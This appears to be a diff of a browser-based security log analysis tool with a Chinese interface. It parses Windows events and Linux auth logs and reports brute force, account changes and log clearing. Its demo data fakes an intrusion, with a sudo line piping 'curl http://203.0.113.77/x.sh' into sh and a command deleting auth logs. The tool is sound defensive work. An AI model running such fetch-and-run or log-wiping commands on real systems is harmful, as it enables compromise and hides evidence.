+  W(base-12*DAY+10*HOUR,7045,{ServiceName:'Veeam Agent',ImagePath:'"C:\\Program Files\\Veeam\\Agent.exe"',AccountName:'LocalSystem'},'Service Control Manager','System');
+  W(base-20*DAY,4624,{TargetUserName:'alice',LogonType:'2',IpAddress:'-'});
+  const L=[];const ln=(t,prog,msg)=>L.push(new Date(t).toISOString()+' web01 '+prog+'['+(1000+Math.floor(rnd()*30000))+']: '+msg);
+  for(let day=20;day>=0;day--){const b=base-day*DAY;
+    ln(b+9.2*HOUR,'sshd','Accepted publickey for deploy from 10.0.0.5 port 50022 ssh2: ED25519 SHA256:abc');
+    ln(b+9.3*HOUR,'sudo','  deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app');
+    for(let i=0;i<8+rnd()*25;i++){const ip=pick(['45.9.148.3','103.145.13.90','218.92.0.31','61.177.172.8']),u=pick(['root','admin','oracle','test','ubuntu','postgres','git']);
+      const tt=b+rnd()*DAY;if(u==='root')ln(tt,'sshd','Failed password for root from '+ip+' port 4022 ssh2');else{ln(tt,'sshd','Invalid user '+u+' from '+ip+' port 4022');ln(tt+900,'sshd','Failed password for invalid user '+u+' from '+ip+' port 4022 ssh2');}}}
+  const lt=base-2*DAY+3.4*HOUR;for(let i=0;i<60;i++)ln(lt+i*4000,'sshd','Failed password for root from 203.0.113.77 port 51'+p2(i)+' ssh2');
+  ln(lt+245000,'sshd','Accepted password for root from 203.0.113.77 port 5199 ssh2');
+  ln(lt+3e5,'useradd','new user: name=sysupd, UID=1003, GID=1003, home=/home/sysupd, shell=/bin/bash, from=/dev/pts/1');
+  ln(lt+3.2e5,'usermod',"add 'sysupd' to group 'sudo'");
+  ln(lt+4e5,'sudo','  sysupd : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c curl -s http://203.0.113.77/x.sh | sh');
+  ln(lt+5e5,'sudo','  sysupd : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/rm -f /var/log/auth.log.1');
+  ln(base-7*DAY+11*HOUR,'sudo','  www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash');
+  ingestLinuxText(st,L.join('\n'),now);
+  st.files.push({name:'（示範資料）SRV-FILE01 Windows 事件',type:'示範',n:0,err:0,size:0,msg:''},{name:'（示範資料）web01 auth.log',type:'示範',n:0,err:0,size:0,msg:''});
+}
+return{newState,ingestFile,ingestWin,ingestLinuxText,analyze,demo,fmt,isPub,SEV,TZ,DAY,HOUR,CAP};
+})();
+if(typeof module!=='undefined')module.exports=Engine;
+</script>
+
+<script>
+'use strict';
+(()=>{
+const $=id=>document.getElementById(id);
+const esc=s=>String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const nf=n=>Number(n).toLocaleString('en-US');
+const {SEV,TZ,DAY,HOUR,fmt,isPub}=Engine;
+const SEVL={crit:'嚴重',high:'高',med:'中',low:'低',info:'資訊'};
+const KL={ok:'登入成功',fail:'登入失敗',dcfail:'網域驗證失敗',lock:'帳號鎖定',priv:'特權使用',acct:'帳號異動',group:'群組異動',logclr:'記錄檔清除',policy:'原則變更',svc:'服務安裝',task:'排程工作',proc:'可疑指令',mal:'惡意程式',avoff:'防護被停用',fw:'防火牆',power:'開關機',sw:'軟體安裝/移除',rdp:'遠端桌面',time:'時間變更',crash:'程式/服務異常',share:'管理共用存取'};
+let st=Engine.newState(),R=null,flt={k:'',sev:'',q:''},page=0,rows=[];
+const PAGE=200;
+const badge=sev=>'<span class="badge b-'+sev+'"><i></i>'+SEVL[sev]+'</span>';
+
+/* ── 載入 ── */
+const drop=$('drop'),fileEl=$('file');
+drop.onclick=()=>fileEl.click();
+fileEl.onchange=()=>{load([...fileEl.files]);fileEl.value='';};
+['dragenter','dragover'].forEach(e=>drop.addEventListener(e,ev=>{ev.preventDefault();drop.classList.add('over');}));
+['dragleave','drop'].forEach(e=>drop.addEventListener(e,ev=>{ev.preventDefault();drop.classList.remove('over');}));
+drop.addEventListener('drop',ev=>load([...ev.dataTransfer.files]));
+window.addEventListener('dragover',e=>e.preventDefault());window.addEventListener('drop',e=>e.preventDefault());
+$('demo').onclick=()=>{st=Engine.newState();Engine.demo(st);render();};
+$('reset').onclick=()=>{st=Engine.newState();R=null;$('report').style.display='none';$('reset').style.display='none';$('progtxt').textContent='';};
+async function load(files){
+  if(!files.length)return;
+  if(st.files.some(f=>f.type==='示範'))st=Engine.newState();
+  $('prog').style.display='block';const bar=$('prog').firstElementChild;
+  for(let i=0;i<files.length;i++){const f=files[i];
+    $('progtxt').textContent='分析中 ('+(i+1)+'/'+files.length+')：'+f.name;
+    await Engine.ingestFile(st,f,p=>{bar.style.width=((i+p)/files.length*100).toFixed(1)+'%';});}
+  $('prog').style.display='none';bar.style.width='0';$('progtxt').textContent='分析完成，可繼續加入其他檔案。';
+  render();
+}
+['ws','we','thr'].forEach(id=>$(id).onchange=()=>{if(R)render(true);});
+
+/* ── 報表 ── */
+function render(keep){
+  const opt={ws:+$('ws').value||0,we:+$('we').value||24,thr:Math.max(3,+$('thr').value||10)};
+  R=Engine.analyze(st,opt);const {A,F,checks}=R;
+  $('report').style.display='block';$('reset').style.display='';
+  // 檔案與範圍
+  const hosts=[...st.hosts.entries()].sort((a,b)=>b[1]-a[1]).map(x=>x[0]);
+  $('meta').innerHTML='<div class="card tblwrap" style="max-height:220px"><table><tr><th>檔案</th><th>類型</th><th class="num">事件數</th><th>備註</th></tr>'+
+    st.files.map(f=>'<tr><td>'+esc(f.name)+'</td><td>'+esc(f.type)+'</td><td class="num">'+(f.type==='示範'?'—':nf(f.n))+'</td><td>'+esc(f.msg||(f.err?f.err+' 筆無法解析（已略過）':''))+'</td></tr>').join('')+'</table></div>'+
+    '<p>主機：<b>'+(hosts.length?esc(hosts.slice(0,6).join('、'))+(hosts.length>6?' 等 '+hosts.length+' 台':''):'—')+'</b>　｜　記錄期間：<b>'+esc(fmt(st.tmin)||'—')+'</b> ～ <b>'+esc(fmt(st.tmax)||'—')+'</b>　｜　總事件數：<b>'+nf(st.total)+'</b>（其中 '+nf(st.evs.length)+' 筆與資安相關）</p>';
+  // 結論
+  const n=A.sevN,v=$('verdict');
+  let cls='v-ok',txt='<b>✔ 沒有發現明顯異常</b><br>在提供的記錄中沒有發現高風險項目。仍建議瀏覽下方的檢核表與低風險項目。';
+  if(n[4]+n[3]>0){cls='v-bad';txt='<b>⛔ 發現 '+(n[4]+n[3])+' 項高風險異常，需要盡快處理</b><br>'+F.filter(f=>SEV[f.sev]>=3).slice(0,4).map(f=>'• '+esc(f.title)).join('<br>');}
+  else if(n[2]>0){cls='v-warn';txt='<b>⚠ 有 '+n[2]+' 項需要注意</b><br>沒有發現高風險項目，但有需要人工確認的事項。';}
+  if(!st.total){cls='';txt='<b>沒有讀到任何事件</b><br>請確認檔案格式是否為支援的記錄檔。';}
+  v.className='card verdict '+cls;v.innerHTML=txt;
+  let notes='';
+  if(st.dropped)notes+='<div class="card warnbox">資安相關事件超過 '+nf(Engine.CAP)+' 筆，超出的 '+nf(st.dropped)+' 筆未納入明細與統計。建議分段分析。</div>';
+  if(st.files.some(f=>/CSV/.test(f.type)))notes+='<div class="card warnbox">CSV 格式只包含文字訊息，部分欄位可能無法正確判讀。建議改用 .evtx 檔取得完整分析。</div>';
+  if(st.os.win&&!st.has.sec&&st.total)notes+='<div class="card warnbox">提供的 Windows 檔案中沒有「安全性 (Security)」記錄，登入與帳號相關項目無法檢查。請加入 Security.evtx。</div>';
+  $('notes').innerHTML=notes;
+  const failIpN=A.failIp.size,pubN=[...A.failIp.keys()].filter(isPub).length;
+  const tile=(lab,val,hint)=>'<div class="card tile"><div class="lab">'+lab+'</div><div class="val">'+val+'</div><div class="hint">'+hint+'</div></div>';
+  $('tiles').innerHTML=
+    tile('高風險異常',nf(n[4]+n[3]),'嚴重 '+n[4]+'、高 '+n[3])+tile('需注意事項',nf(n[2]),'中風險')+
+    tile('登入成功',nf(A.ok),'另有 '+nf(st.sysLogon)+' 次系統/服務登入')+tile('登入失敗',nf(A.fail),A.ok+A.fail?'失敗率 '+(A.fail/(A.ok+A.fail)*100).toFixed(1)+'%':'—')+
+    tile('失敗來源 IP',nf(failIpN),'其中外網 '+pubN+' 個')+tile('帳號/群組異動',nf((A.kinds.get('acct')||0)+(A.kinds.get('group')||0)),'新增、刪除、改密碼、加群組');
+  // 異常發現
+  $('findings').innerHTML=F.length?F.map((f,i)=>'<details class="card finding f-'+f.sev+'"'+(SEV[f.sev]>=4?' open':'')+'><summary>'+badge(f.sev)+'<span class="t">'+esc(f.title)+'</span></summary><div class="body">'+
+    '<div class="lbl">這代表什麼</div><p>'+esc(f.what)+'</p>'+
+    (f.table?'<div class="lbl">證據</div><div class="tblwrap" style="max-height:340px">'+tbl(f.table)+'</div>'+(f.table.more?'<div class="note">…還有 '+nf(f.table.more)+' 筆，請到「事件明細」查看</div>':''):'')+
+    '<div class="lbl">建議處置</div><div class="advice">'+esc(f.advice)+'</div>'+
+    (f.filt?'<p class="noprint"><button data-fk="'+esc(f.filt.k)+'">在事件明細中查看相關事件 →</button></p>':'')+'</div></details>').join('')
+    :'<div class="card empty">沒有發現需要列出的項目。</div>';
+  // 檢核表
+  const SL={bad:['crit','異常'],warn:['med','需注意'],note:['low','有紀錄，請確認'],ok:['ok','未發現異常'],na:['info','無資料']};
+  $('checks').innerHTML='<tr><th>結果</th><th>檢查項目</th><th>說明</th></tr>'+checks.map(c=>'<tr><td><span class="badge b-'+SL[c.status][0]+'"><i></i>'+SL[c.status][1]+'</span></td><td>'+esc(c.name)+'</td><td>'+esc(c.note)+'</td></tr>').join('');
+  // 圖表
+  drawCharts();
+  // 明細
+  const ks=[...A.kinds.entries()].sort((a,b)=>b[1]-a[1]);
+  $('f-k').innerHTML='<option value="">全部類別</option>'+ks.map(([k,c])=>'<option value="'+k+'">'+esc(KL[k]||k)+' ('+nf(c)+')</option>').join('');
+  if(!keep)flt={k:'',sev:'',q:''};
+  $('f-k').value=flt.k;$('f-sev').value=flt.sev;$('f-q').value=flt.q;
+  applyFilter();
+}
+function tbl(t){return '<table><tr>'+t.cols.map(c=>'<th>'+esc(c)+'</th>').join('')+'</tr>'+t.rows.map(r=>'<tr>'+r.map(c=>typeof c==='number'?'<td class="num">'+nf(c)+'</td>':'<td class="wrapcell">'+esc(c)+'</td>').join('')+'</tr>').join('')+'</table>';}
+
+function bars(el,items,o){o=o||{};
+  if(!items.length){el.innerHTML='<div class="empty">沒有資料</div>';return;}
+  const max=Math.max(...items.map(x=>x[1]));
+  el.innerHTML='<div class="bars'+(o.orange?' o':'')+(o.click?' click':'')+'">'+items.map(([l,v])=>{
+    const q=o.click?' data-'+o.click+'="'+esc(o.key?o.key(l):l)+'"':'';const lab=o.label?o.label(l):esc(l);
+    return '<div class="l"'+q+' title="'+esc(l)+'">'+lab+'</div><div class="tr"'+q+' data-tip="'+esc(l)+'：'+nf(v)+' 次"><i style="width:'+(v/max*100).toFixed(1)+'%"></i></div><div class="v">'+nf(v)+'</div>';}).join('')+'</div>';}
+function heat(el,arr,orange,opt){
+  const max=Math.max(1,...arr),wd=['一','二','三','四','五','六','日'];let h='<div class="heat'+(orange?' o':'')+'"><div></div>';
+  for(let i=0;i<24;i++)h+='<div class="hh">'+(i%3===0?i:'')+'</div>';
+  for(let d=0;d<7;d++){h+='<div>'+wd[d]+'</div>';for(let i=0;i<24;i++){const v=arr[d*24+i],off=i<opt.ws||i>=opt.we||d>=5;
+    h+='<div class="c'+(off?' off':'')+'" data-tip="星期'+wd[d]+' '+i+':00–'+(i+1)+':00\n'+nf(v)+' 次'+(off?'（非上班時間）':'')+'">'+(v?'<i style="opacity:'+(0.12+0.88*v/max).toFixed(2)+'"></i>':'')+'</div>';}}
+  el.innerHTML=h+'</div>';}
+function timeline(el,A){
+  const span=st.tmax-st.tmin,hourly=span<=3*DAY,src=hourly?A.hourly:A.daily,unit=hourly?HOUR:DAY;
+  if(!src.size){el.innerHTML='<div class="empty">沒有登入事件</div>';return;}
+  const ks=[...src.keys()],lo=Math.min(...ks),hi=Math.max(...ks),g=Math.ceil((hi-lo+1)/160),B=[];
+  for(let i=lo;i<=hi;i+=g){let ok=0,fail=0;for(let j=i;j<i+g;j++){const v=src.get(j);if(v){ok+=v[0];fail+=v[1];}}B.push({i,ok,fail});}
+  const lab=i=>{const d=new Date(i*unit+TZ);return (d.getMonth()+1)+'/'+d.getDate()+(hourly?' '+d.getHours()+':00':'');};
+  const W=Math.max(320,el.clientWidth||900),H=230,ml=46,mr=8,mt=10,mb=22,pw=W-ml-mr,ph=H-mt-mb;
+  let max=Math.max(1,...B.map(b=>b.ok+b.fail));const pow=Math.pow(10,Math.floor(Math.log10(max)));max=Math.ceil(max/pow*2)/2*pow;if(max<4)max=4;
+  const bw=pw/B.length,w=Math.max(1,Math.min(26,bw-2)),y=v=>mt+ph-v/max*ph;let s='<svg width="'+W+'" height="'+H+'" role="img" aria-label="登入成功與失敗時間分布">';
+  for(let k=0;k<=4;k++){const v=max*k/4,yy=y(v);s+='<line x1="'+ml+'" x2="'+(W-mr)+'" y1="'+yy+'" y2="'+yy+'" stroke="var(--'+(k?'grid':'axis')+')"/><text x="'+(ml-6)+'" y="'+(yy+4)+'" text-anchor="end">'+nf(Math.round(v))+'</text>';}
+  const step=Math.max(1,Math.ceil(B.length/Math.max(2,Math.floor(pw/80))));
+  B.forEach((b,idx)=>{const x=ml+idx*bw+(bw-w)/2,hOk=b.ok/max*ph,hF=b.fail/max*ph,gap=b.ok&&b.fail&&hOk>3&&hF>3?2:0;
+    if(b.ok)s+='<rect x="'+x.toFixed(1)+'" y="'+(mt+ph-hOk).toFixed(1)+'" width="'+w.toFixed(1)+'" height="'+Math.max(1,hOk).toFixed(1)+'" fill="var(--s1)"/>';
+    if(b.fail)s+='<rect x="'+x.toFixed(1)+'" y="'+(mt+ph-hOk-hF).toFixed(1)+'" width="'+w.toFixed(1)+'" height="'+Math.max(1,hF-gap).toFixed(1)+'" fill="var(--s2)"/>';
+    if(idx%step===0)s+='<text x="'+(x+w/2).toFixed(1)+'" y="'+(H-6)+'" text-anchor="middle">'+lab(b.i)+'</text>';
+    s+='<rect x="'+(ml+idx*bw).toFixed(1)+'" y="'+mt+'" width="'+bw.toFixed(1)+'" height="'+ph+'" fill="transparent" data-tip="'+lab(b.i)+(g>1?' 起 '+g+(hourly?' 小時':' 天'):'')+'\n登入成功：'+nf(b.ok)+'\n登入失敗：'+nf(b.fail)+'"/>';});
+  el.innerHTML=s+'</svg>';}
+function drawCharts(){if(!R)return;const A=R.A,top=(m,n=10)=>[...m.entries()].sort((a,b)=>b[1]-a[1]).slice(0,n);
+  const opt={ws:+$('ws').value||0,we:+$('we').value||24};
+  timeline($('timeline'),A);
+  const ipLab=l=>esc(l)+'<small>'+(isPub(l)?'外網':'內網')+'</small>';
+  bars($('c-failip'),top(A.failIp),{orange:1,click:'q',label:ipLab});
+  bars($('c-failuser'),top(A.failUser),{orange:1,click:'q'});
+  bars($('c-reason'),top(A.reason),{orange:1});
+  bars($('c-okuser'),top(A.okUser),{click:'q'});
+  bars($('c-okip'),top(A.okIp),{click:'q',label:ipLab});
+  bars($('c-ltype'),top(A.ltype));
+  heat($('h-ok'),A.heatOk,0,opt);heat($('h-fail'),A.heatFail,1,opt);
+  bars($('c-kinds'),top(A.kinds,30).map(([k,v])=>[KL[k]||k,v]),{click:'fk',key:l=>Object.keys(KL).find(k=>KL[k]===l)||l});
+}
+let rz;window.addEventListener('resize',()=>{clearTimeout(rz);rz=setTimeout(()=>{if(R)timeline($('timeline'),R.A);},150);});
+
+/* ── 明細 ── */
+function applyFilter(){
+  const q=flt.q.trim().toLowerCase(),ms=flt.sev===''?-1:+flt.sev;
+  rows=st.evs.filter(e=>(!flt.k||e.k===flt.k)&&SEV[e.sev]>=ms&&(!q||(e.u+'\n'+e.ip+'\n'+e.h+'\n'+e.m+'\n'+e.id).toLowerCase().includes(q)));
+  rows.reverse();page=0;drawTable();}
+function drawTable(){
+  const s=page*PAGE,part=rows.slice(s,s+PAGE);
+  $('evtable').innerHTML='<tr><th>時間</th><th>嚴重度</th><th>類別</th><th>主機</th><th>帳號</th><th>來源 IP</th><th>說明</th><th>代碼</th></tr>'+
+    (part.length?part.map(e=>'<tr><td style="white-space:nowrap">'+fmt(e.t)+'</td><td>'+badge(e.sev)+'</td><td style="white-space:nowrap">'+esc(KL[e.k]||e.k)+'</td><td>'+esc(e.h)+'</td><td>'+esc(e.u)+'</td><td>'+esc(e.ip)+(e.ip?' <small style="color:var(--muted)">'+(isPub(e.ip)?'外網':'內網')+'</small>':'')+'</td><td class="wrapcell">'+esc(e.m)+'</td><td>'+esc(e.id)+'</td></tr>').join('')
+      :'<tr><td colspan="8" class="empty">沒有符合條件的事件</td></tr>');
+  $('pginfo').textContent=rows.length?'第 '+nf(s+1)+'–'+nf(Math.min(rows.length,s+PAGE))+' 筆，共 '+nf(rows.length)+' 筆':'';
+  $('pgprev').disabled=page===0;$('pgnext').disabled=s+PAGE>=rows.length;}
+$('pgprev').onclick=()=>{page--;drawTable();};$('pgnext').onclick=()=>{page++;drawTable();};
+$('f-k').onchange=e=>{flt.k=e.target.value;applyFilter();};$('f-sev').onchange=e=>{flt.sev=e.target.value;applyFilter();};
+let qt;$('f-q').oninput=e=>{clearTimeout(qt);qt=setTimeout(()=>{flt.q=e.target.value;applyFilter();},200);};
+$('f-clear').onclick=()=>{flt={k:'',sev:'',q:''};$('f-k').value='';$('f-sev').value='';$('f-q').value='';applyFilter();};
+$('f-csv').onclick=()=>{const c=v=>{v=String(v==null?'':v);if(/^[=+\-@]/.test(v))v="'"+v;return '"'+v.replace(/"/g,'""')+'"';};
+  const out=['時間,嚴重度,類別,主機,帳號,來源IP,說明,代碼'].concat(rows.map(e=>[fmt(e.t),SEVL[e.sev],KL[e.k]||e.k,e.h,e.u,e.ip,e.m,e.id].map(c).join(',')));
+  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob(['\ufeff'+out.join('\r\n')],{type:'text/csv'}));a.download='資安事件明細.csv';a.click();setTimeout(()=>URL.revokeObjectURL(a.href),5000);};
+document.addEventListener('click',ev=>{const t=ev.target.closest('[data-q],[data-fk]');if(!t)return;
+  if(t.dataset.fk!==undefined){flt={k:t.dataset.fk,sev:'',q:''};}else{flt={k:'',sev:'',q:t.dataset.q};}
+  $('f-k').value=flt.k;$('f-sev').value='';$('f-q').value=flt.q;applyFilter();$('s-ev').scrollIntoView({behavior:'smooth'});});
+/* ── 提示框 ── */
+const tip=$('tip');
+document.addEventListener('mousemove',ev=>{const t=ev.target.closest&&ev.target.closest('[data-tip]');
+  if(!t){tip.style.display='none';return;}tip.textContent=t.dataset.tip;tip.style.display='block';
+  const w=tip.offsetWidth,h=tip.offsetHeight;let x=ev.clientX+14,y=ev.clientY+14;if(x+w>innerWidth-8)x=ev.clientX-w-10;if(y+h>innerHeight-8)y=ev.clientY-h-10;
+  tip.style.left=x+'px';tip.style.top=y+'px';});
+window.printReport=()=>{document.querySelectorAll('details.finding').forEach(d=>d.open=true);window.print();};
+document.querySelectorAll('.tab').forEach(b=>b.onclick=()=>{
+  document.querySelectorAll('.tab').forEach(x=>x.classList.toggle('on',x===b));
+  document.querySelectorAll('.tabp').forEach(p=>p.hidden=p.id!==b.dataset.tab);});
+document.querySelectorAll('.copy').forEach(b=>b.onclick=()=>{const el=$(b.dataset.copy),txt=el.textContent;
+  const done=()=>{b.textContent='已複製 ✔';setTimeout(()=>b.textContent='複製指令',1800);};
+  const fallback=()=>{const r=document.createRange();r.selectNodeContents(el);const s=getSelection();s.removeAllRanges();s.addRange(r);try{document.execCommand('copy');done();}catch(e){b.textContent='請按 Ctrl+C 複製';}};
+  if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(txt).then(done,fallback);else fallback();});
+if(location.hash==='#demo')$('demo').click();
+})();
+</script>
+</body>
+</html>
